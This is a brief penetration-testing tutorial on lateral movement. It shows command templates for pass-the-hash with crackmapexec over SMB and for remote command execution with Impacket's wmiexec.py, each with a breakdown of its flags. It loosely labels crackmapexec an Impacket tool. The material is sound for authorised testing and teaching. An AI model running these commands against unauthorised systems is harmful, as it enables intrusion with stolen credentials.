Practical Lateral Movement with Impacket Tools

Executing commands remotely using Pass-the-Hash and WMI

# Lateral movement with PtH using crackmapexec
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -x 'whoami'

# Remote command execution via WMI with Impacket
python3 wmiexec.py <DOMAIN>/<USERNAME>:<PASSWORD_OR_HASH>@<TARGET_IP> 'whoami'
Key Takeaway

Impacket tools like crackmapexec and wmiexec.py are essential for performing lateral movement, allowing remote command execution using hashes or credentials.

crackmapexec (CME) Breakdown

  • smb <TARGET_IP>: Specifies the SMB protocol and target IP.
  • -u <USERNAME>: The username for authentication.
  • -H <NTLM_HASH>: The NTLM hash for Pass-the-Hash authentication.
  • -x 'whoami': Executes the whoami command on the remote system.

wmiexec.py Breakdown

  • <DOMAIN>/<USERNAME>:<PASSWORD_OR_HASH>@<TARGET_IP>: Specifies the target domain, user, credentials (password or hash), and IP.
  • 'whoami': The command to execute on the remote system.
